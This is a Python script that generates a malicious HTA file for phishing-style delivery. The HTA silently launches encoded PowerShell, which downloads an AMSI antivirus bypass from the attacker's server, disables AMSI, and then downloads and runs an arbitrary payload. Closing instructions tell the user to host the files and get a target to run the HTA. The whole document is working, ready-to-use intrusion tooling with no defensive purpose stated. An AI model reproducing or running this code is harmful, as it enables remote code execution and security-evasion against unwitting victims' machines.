#!/usr/bin/env python3

import requests, sys, base64, os
import argparse, time

# AMSI Bypass stager generator based on:
# https://rastamouse.me/2018/10/amsiscanbuffer-bypass-part-2/
# bypass code from: https://github.com/rasta-mouse/AmsiScanBufferBypass
# tested on python3

# file name for AMSI Bypass PowerShell script
F_AMSI_BYPASS = "amsi-bypass"
F_HTA = "delivery.hta"
F_PAYLOAD = "payload"

def get_base_url(ip, port, tls):
    url = "{}:{}".format(ip, port)

    if tls:
        url = "https://" + url
    else:
        url = "http://" + url

    return url

def get_amsi_url(ip, port, tls):
    return get_base_url(ip, port, tls) + "/" + F_AMSI_BYPASS

def get_payload_url(ip, port, tls):
    return get_base_url(ip, port, tls) + "/" + F_PAYLOAD

def get_hta_url(ip, port, tls):
    return get_base_url(ip, port, tls) + "/" + F_HTA

def download_amsi_bypass():
    amsi_bypass_source = "https://raw.githubusercontent.com/rasta-mouse/AmsiScanBufferBypass/master/ASBBypass.ps1"
    if not os.path.isfile(F_AMSI_BYPASS):
        # download the file
        print("Downloading AMSI bypass code from {}...".format(amsi_bypass_source))
        time.sleep(3) # give user opportunity to abort

        with open(F_AMSI_BYPASS, 'wb') as f:
            r = requests.get(amsi_bypass_source)
            f.write(r.content)

def generate_hta(ip, port, tls):
    ps_template = 'iex ((new-object net.webclient).downloadstring("{}")); if([Bypass.AMSI]::Disable() -eq "0") {{ iex ((new-object net.webclient).downloadstring("{}")) }}'
    hta_template = """\
<script language="VBScript">
    Function var_func()
        Dim var_shell
        Set var_shell = CreateObject("Wscript.Shell")
        var_shell.run "powershell.exe -nop -w 1 -enc {}", 0, true
    End Function

    var_func
    self.close
</script>\
    """

    # creating base64 encoded command for initial PowerShell launcher in HTA
    # for more info on this encoding trickery see:
    # https://byt3bl33d3r.github.io/converting-commands-to-powershell-compatible-encoded-strings-for-dummies.html
    ps_script = ps_template.format(get_amsi_url(ip, port, tls), get_payload_url(ip, port, tls))
    ps_script = base64.b64encode(ps_script.encode('UTF-16LE')).decode('ascii')

    return hta_template.format(ps_script)


# do stuff!
def main():
    parser = argparse.ArgumentParser(description="AMSI_BYPASSR: generate files for AMSI bypass per https://rastamouse.me/2018/10/amsiscanbuffer-bypass-part-2/")
    parser.add_argument("IP", help="IP address (or name) of the machine that will host the files (AMSI bypass, stager)")
    parser.add_argument("-p", "--port", help="port number for the machine that will host the files", type=int, default=8080)
    parser.add_argument("--tls", help="use HTTPS for stager URLs", action="store_true")
    args = parser.parse_args()

    # play chicken if file already exists
    if os.path.isfile(F_HTA):
        print("{}: file already exists, exiting...".format(F_HTA))
        sys.exit(1)

    # generate and save HTA for bypass and payload delivery
    hta = generate_hta(args.IP, args.port, args.tls)
    with open(F_HTA, "w") as f:
        f.write(hta)
    
    # download the AMSI bypass code if needed and save it as F_AMSI_BYPASS
    download_amsi_bypass()

    # some marginally helpful user instructions
    print("\nSUCCESS!!!\n")
    print("The following files have been saved to the current directory:")
    print("  '{}' - AMSI Bypass code (per https://rastamouse.me/2018/10/amsiscanbuffer-bypass-part-2/)".format(F_AMSI_BYPASS))
    print("  '{}' - HTA file for payload delivery".format(F_HTA))
    print("\nTODO:")
    print("1) save your PowerShell payload as '{}'".format(F_PAYLOAD))
    print("2) launch a web server on {ip}:{port} to serve the files (for example, 'python3 -m http.server {port}').".format(ip=args.IP, port=args.port))
    print("3) get the target to run {}".format(get_hta_url(args.IP, args.port, args.tls)))

if __name__ == "__main__":
    main()
